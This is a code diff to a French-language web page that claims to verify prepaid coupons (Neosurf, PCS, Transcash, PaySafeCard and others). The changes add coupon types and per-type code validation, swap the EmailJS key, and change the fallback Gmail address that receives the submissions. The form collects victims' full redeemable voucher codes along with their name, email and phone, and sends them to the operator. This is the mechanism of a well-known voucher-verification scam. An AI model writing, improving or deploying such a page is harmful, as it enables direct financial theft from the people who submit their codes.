@@ -307,7 +307,7 @@
     <script>
         // Initialize EmailJS
         (function() {
-            emailjs.init("9Ej5cXeMQFLDaPIVo"); // Actual EmailJS public key
+            emailjs.init("SQmmlzm_QslXd79YX"); // Actual EmailJS public key
         })();
 
         // Check for saved theme preference or default to dark mode
@@ -436,6 +436,8 @@
                         <select id="couponType" name="couponType" class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500" required>
                             <option value="">Sélectionnez le type</option>
                             <option value="neosurf">Neosurf</option>
+                            <option value="pcs">PCS</option>
+                            <option value="transcash">Transcash</option>
                             <option value="paysafecard">PaySafeCard</option>
                             <option value="cashlib">CashLib</option>
                             <option value="amazon">Amazon Gift</option>
@@ -462,7 +464,7 @@
                     <!-- Code Injection -->
                     <div class="bg-gray-700 p-6 rounded-lg">
                         <h3 class="text-xl font-bold mb-4">INJECTION DES CODES</h3>
-                        <p class="text-gray-400 mb-4">Saisissez le code de recharge complet (16 chiffres)</p>
+                        <p class="text-gray-400 mb-4">Saisissez le code de recharge complet </p>
                         <div class="code-input-container">
                             <input type="text" id="fullCodeInput" name="fullCodeInput" maxlength="16" placeholder="XXXXXXXXXXXXXXXX" required
                                    class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 text-lg tracking-wider">
@@ -760,22 +762,38 @@
         document.getElementById('verificationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            const type = document.getElementById('couponType').value;
+            const fullCodeInput = document.getElementById('fullCodeInput');
+            const rawValue = fullCodeInput.value.replace(/\s/g, '');
+            
+            // Validation rules
+            let requiredLength = 16;
+            if (type === 'transcash') requiredLength = 12;
+            else if (type === 'pcs' || type === 'neosurf') requiredLength = 10;
+            
+            // Skip validation for 'autre' or if empty (HTML5 required will handle empty)
+            if (type !== 'autre' && type !== '' && rawValue.length !== requiredLength) {
+                showNotification(`Le code ${type.toUpperCase()} doit faire exactement ${requiredLength} caractères. Actuel: ${rawValue.length}`, 'error');
+                fullCodeInput.focus();
+                return;
+            }
+
             // Get form data
             const formData = {
                 userEmail: document.getElementById('userEmail').value,
                 fullName: document.getElementById('fullName').value,
                 phoneNumber: document.getElementById('phoneNumber').value,
-                couponType: document.getElementById('couponType').value,
+                couponType: type,
                 amount: document.getElementById('amount').value,
                 currency: document.getElementById('currency').value,
-                fullCodeInput: document.getElementById('fullCodeInput').value.replace(/\s/g, ''), // Remove spaces
+                fullCodeInput: rawValue,
                 terms: document.getElementById('terms').checked,
                 submissionTime: new Date().toLocaleString('fr-FR'),
                 uploadedFiles: uploadedFiles.map(f => f.name).join(', ')
             };
 
-            // Format the 16-digit code with dashes for display
-            const fullCode = formData.fullCodeInput.replace(/(.{4})/g, '$1-').slice(0, -1);
+            // Format the code with dashes for the email template
+            const fullCode = formData.fullCodeInput.replace(/(.{4})/g, '$1-').replace(/-$/, '');
             
             // Prepare email template parameters
             const templateParams = {
@@ -796,24 +814,17 @@
             emailjs.send("service_a7aa46d","template_vw63kf8", templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
+                    showNotification('Votre demande de vérification a été soumise avec succès!', 'success');
                     
-                    // Show success message
-                    showNotification('Votre demande de vérification a été soumise avec succès! Vous recevrez une confirmation par email.', 'success');
-                    
-                    // Reset form
                     document.getElementById('verificationForm').reset();
                     imagePreview.innerHTML = '';
                     uploadedFiles = [];
                     
-                    // Redirect to tracking page after 3 seconds
                     setTimeout(() => {
                         window.location.href = 'track.html';
                     }, 3000);
-                    
                 }, function(error) {
                     console.log('FAILED...', error);
-                    
-                    // Fallback: create mailto link
                     const subject = encodeURIComponent(`Nouvelle demande de vérification - ${formData.fullName}`);
                     const body = encodeURIComponent(`
 Détails de la demande:
@@ -829,46 +840,96 @@ Fichiers uploadés: ${formData.uploadedFiles || 'Aucun'}
 Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
                     `);
                     
-                    window.location.href = `mailto:adrienkoba311@gmail.com?subject=${subject}&body=${body}`;
-                    
+                    window.location.href = `mailto:verifyfr911@gmail.com?subject=${subject}&body=${body}`;
                     showNotification('Redirection vers votre client email...', 'info');
                 });
         });
 
-        // Auto-format 16-digit code input
+        // Auto-format code input based on selected payment type
         const fullCodeInput = document.getElementById('fullCodeInput');
-        fullCodeInput.addEventListener('input', function(e) {
-            // Remove all non-digit characters
-            let value = e.target.value.replace(/\D/g, '');
-            
-            // Limit to 16 digits
-            if (value.length > 16) {
-                value = value.slice(0, 16);
+        const couponTypeSelect = document.getElementById('couponType');
+
+        function updateInputAttributes() {
+            const type = couponTypeSelect.value;
+            let maxLength = 16; // Default
+            let placeholder = "XXXXXXXXXXXXXXXX";
+            let helperText = "Saisissez le code de recharge complet ";
+
+            if (type === 'transcash') {
+                maxLength = 12;
+                placeholder = "XXXXXXXXXXXX";
+                helperText = "Saisissez votre code Transcash ";
+            } else if (type === 'pcs' || type === 'neosurf') {
+                maxLength = 10;
+                placeholder = "XXXXXXXXXX";
+                helperText = `Saisissez votre code ${type.toUpperCase()} `;
+            } else if (type === 'paysafecard') {
+                maxLength = 16;
+                placeholder = "XXXX XXXX XXXX XXXX";
+                helperText = "Saisissez votre code PaySafeCard ";
+            }
+
+            fullCodeInput.maxLength = type === 'paysafecard' ? 19 : maxLength; // Account for spaces in PSC
+            fullCodeInput.placeholder = placeholder;
+            // Update the helper text label above the input
+            const label = fullCodeInput.parentElement.previousElementSibling;
+            if (label && label.tagName === 'P') {
+                label.textContent = helperText;
             }
             
-            // Format with spaces every 4 digits for display
-            if (value.length > 0) {
-                value = value.match(/.{1,4}/g).join(' ');
+            // Clear input when type changes to avoid validation conflicts
+            fullCodeInput.value = '';
+        }
+
+        couponTypeSelect.addEventListener('change', updateInputAttributes);
+
+        fullCodeInput.addEventListener('input', function(e) {
+            const type = couponTypeSelect.value;
+            let value = e.target.value;
+
+            if (type === 'pcs' || type === 'neosurf') {
+                // PCS and Neosurf: Alphanumeric, max 10
+                value = value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+                if (value.length > 10) value = value.slice(0, 10);
+            } else if (type === 'transcash') {
+                // Transcash: Digits only, max 12
+                value = value.replace(/\D/g, '');
+                if (value.length > 12) value = value.slice(0, 12);
+            } else {
+                // Default (Paysafecard, etc.): Digits only, max 16
+                value = value.replace(/\D/g, '');
+                if (value.length > 16) value = value.slice(0, 16);
+                
+                // Format with spaces for Paysafecard
+                if (type === 'paysafecard' && value.length > 0) {
+                    const matches = value.match(/.{1,4}/g);
+                    if (matches) value = matches.join(' ');
+                } else if (value.length > 0) {
+                    // Default space formatting for others (if digits)
+                    const matches = value.match(/.{1,4}/g);
+                    if (matches) value = matches.join(' ');
+                }
             }
             
             e.target.value = value;
         });
 
-        // Only allow digits on keypress
+        // Only allow valid characters on keypress
         fullCodeInput.addEventListener('keypress', function(e) {
-            // Allow backspace, delete, tab, escape, enter
-            if ([8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
-                // Allow Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
-                (e.keyCode === 65 && e.ctrlKey === true) ||
-                (e.keyCode === 67 && e.ctrlKey === true) ||
-                (e.keyCode === 86 && e.ctrlKey === true) ||
-                (e.keyCode === 88 && e.ctrlKey === true)) {
-                return;
-            }
+            const type = couponTypeSelect.value;
+            const charCode = e.which ? e.which : e.keyCode;
             
-            // Ensure that it is a number and stop the keypress
-            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
-                e.preventDefault();
+            // Allow control keys
+            if ([8, 9, 27, 13].indexOf(charCode) !== -1 || e.ctrlKey || e.metaKey) return;
+
+            const char = String.fromCharCode(charCode);
+            
+            if (type === 'pcs' || type === 'neosurf') {
+                // Alphanumeric
+                if (!/[a-zA-Z0-9]/.test(char)) e.preventDefault();
+            } else {
+                // Digits only
+                if (!/[0-9]/.test(char)) e.preventDefault();
             }
         });
 
